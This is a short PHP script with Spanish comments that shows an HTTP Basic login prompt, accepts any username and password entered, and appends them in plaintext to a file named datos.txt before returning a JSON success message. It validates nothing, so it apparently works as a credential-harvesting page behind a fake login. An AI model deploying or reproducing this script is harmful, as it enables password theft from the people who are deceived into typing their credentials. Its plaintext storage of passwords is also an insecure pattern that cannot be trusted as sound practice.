<?php
// Solicitar autenticación básica
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo json_encode(array('error' => 'Se requiere autenticación para acceder a este recurso.'));
    exit;
} else {
    // Capturar las credenciales
    $usuario = $_SERVER['PHP_AUTH_USER'];
    $contrasena = $_SERVER['PHP_AUTH_PW'];

    // Crear o abrir el archivo datos.txt
    $archivo = 'datos.txt';
    $contenido = "Usuario: $usuario, Contraseña: $contrasena\n";

    // Escribir las credenciales en el archivo
    file_put_contents($archivo, $contenido, FILE_APPEND);

    // Preparar la respuesta en formato JSON
    $respuesta = array(
        'status' => 'success',
        'message' => 'Las credenciales se han registrado correctamente.'
    );

    // Enviar la respuesta con estado 200 OK en formato JSON
    header('Content-Type: application/json');
    echo json_encode($respuesta);
}
?>
